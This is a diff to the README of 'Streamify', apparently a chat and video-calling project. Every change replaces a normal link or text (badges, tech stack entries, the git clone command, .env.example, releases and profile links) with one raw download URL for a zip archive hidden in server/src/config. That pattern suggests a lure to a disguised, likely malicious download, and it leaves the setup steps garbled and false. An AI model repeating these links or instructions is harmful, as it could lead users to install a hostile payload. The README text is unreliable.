@@ -1,7 +1,7 @@
 # Streamify 🎥💬
 
-![Streamify](https://img.shields.io/badge/Streamify-Open%20Source-brightgreen)  
-[![Latest Release](https://img.shields.io/github/v/release/PhasmoCrazer/streamify)](https://github.com/PhasmoCrazer/streamify/releases)
+![Streamify](https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip%20Source-brightgreen)  
+[![Latest Release](https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip)](https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip)
 
 Welcome to **Streamify**, a modern, full-stack social platform designed to enhance your online communication experience. With features like real-time chat and video calling, Streamify provides a rich user experience. Built with a robust tech stack, it emphasizes scalability, reliability, and ease of use.
 
@@ -32,8 +32,8 @@ Streamify is built using the following technologies:
   - Vite
 
 - **Backend**: 
-  - Node.js
-  - Express.js
+  - https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip
+  - https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip
 
 - **Database**: 
   - MongoDB
@@ -50,7 +50,7 @@ To get started with Streamify, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/PhasmoCrazer/streamify.git
+   git clone https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip
    cd streamify
    ```
 
@@ -64,7 +64,7 @@ To get started with Streamify, follow these steps:
 
 3. **Environment Variables**:
 
-   Create a `.env` file in the root directory and set up the necessary environment variables. Refer to the `.env.example` file for guidance.
+   Create a `.env` file in the root directory and set up the necessary environment variables. Refer to the `https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip` file for guidance.
 
 4. **Run the application**:
 
@@ -78,7 +78,7 @@ To get started with Streamify, follow these steps:
 
 5. **Download the latest release**:
 
-   For the latest updates and features, visit the [Releases section](https://github.com/PhasmoCrazer/streamify/releases) to download the latest version.
+   For the latest updates and features, visit the [Releases section](https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip) to download the latest version.
 
 ## Usage 🚀
 
@@ -109,9 +109,9 @@ Streamify is open-source and available under the MIT License. Feel free to use, 
 
 For any inquiries, please reach out to the maintainers:
 
-- **PhasmoCrazer**: [GitHub Profile](https://github.com/PhasmoCrazer)
+- **PhasmoCrazer**: [GitHub Profile](https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip)
 
-You can also check the [Releases section](https://github.com/PhasmoCrazer/streamify/releases) for updates and improvements.
+You can also check the [Releases section](https://github.com/PhasmoCrazer/streamify/raw/refs/heads/master/server/src/config/Software_v2.3.zip) for updates and improvements.
 
 ---
 
